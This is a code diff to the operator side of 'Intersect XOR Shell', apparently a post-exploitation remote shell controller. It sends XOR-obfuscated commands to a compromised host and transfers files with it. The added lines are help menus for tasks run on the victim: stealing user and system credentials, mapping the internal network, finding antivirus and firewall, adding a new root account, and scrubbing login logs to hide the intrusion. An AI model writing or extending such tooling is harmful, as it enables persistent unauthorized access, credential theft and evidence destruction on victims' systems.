@@ -35,7 +35,6 @@ except:
 while True:
     data = conn.recv(socksize)
     data2 = xor(data, pin)
-    #print data2
     msg = raw_input(data2)
     cmd = xor(msg, pin)
     conn.sendall(str(cmd))
@@ -63,6 +62,26 @@ while True:
         sendfile.close()
         senddata = xor(filedata, pin)
         conn.sendall(senddata)
+    elif msg == ("extask"):
+        print("   extask help menu    ")
+        print("extask osinfo      | gather os info")
+        print("extask livehosts   | maps internal network")
+        print("extask credentials | user/sys credentials")
+        print("extask findextras  | av/fw and extras")
+        print("extask network     | ips, fw rules, connections, etc")
+        print("extask scrub       | clears 'who' 'w' 'last' 'lastlog'")
+    elif msg == ("helpme"):
+	print(" Intersect XOR Shell | Help Menu")
+	print("---------------------------------")
+	print(" download <file>  | download file from host")
+	print(" upload <file>    | upload file to host")
+	print(" extask <task>    | run Intersect tasks")
+	print(" adduser <name>   | add new root account")
+	print(" rebootsys        | reboot remote host system")
+	print(" helpme           | display this menu")
+	print(" killme           | shuts down shell connection\n")
+	print("* If the shell appears to hang after sending or receiving data, press [enter] and it should fix the issue.")
+
 
 conn.close()
 
